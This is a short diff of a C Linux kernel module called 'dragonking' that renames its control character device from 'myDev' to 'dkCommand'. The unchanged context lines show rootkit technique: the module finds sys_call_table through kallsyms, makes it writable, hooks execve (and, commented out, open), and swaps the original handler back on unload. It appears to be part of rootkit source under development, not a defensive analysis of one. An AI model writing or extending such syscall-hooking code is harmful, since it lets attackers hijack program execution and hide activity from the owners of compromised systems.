@@ -83,7 +83,7 @@ void set_addr_ro(unsigned long addr)
 
 static int __init dragonking_init(void)
 {
-	int t = register_chrdev(666, "myDev", &fops);
+	int t = register_chrdev(666, "dkCommand", &fops);
 	printk("Device register return: %d\n", t);
 	//Search /proc/kallsyms for sys_call_table's address
 	sys_call_table = (unsigned long**)kallsyms_lookup_name("sys_call_table");
@@ -111,7 +111,7 @@ static int __init dragonking_init(void)
 
 static void __exit dragonking_cleanup(void)
 {
-	    unregister_chrdev(666, "myDev");
+	    unregister_chrdev(666, "dkCommand");
 	    set_addr_rw((unsigned long) sys_call_table);
 	    sys_call_table[__NR_execve] = (unsigned long*)&orig_execve;
 	    //sys_call_table[__NR_open] = (unsigned long*)&orig_open;
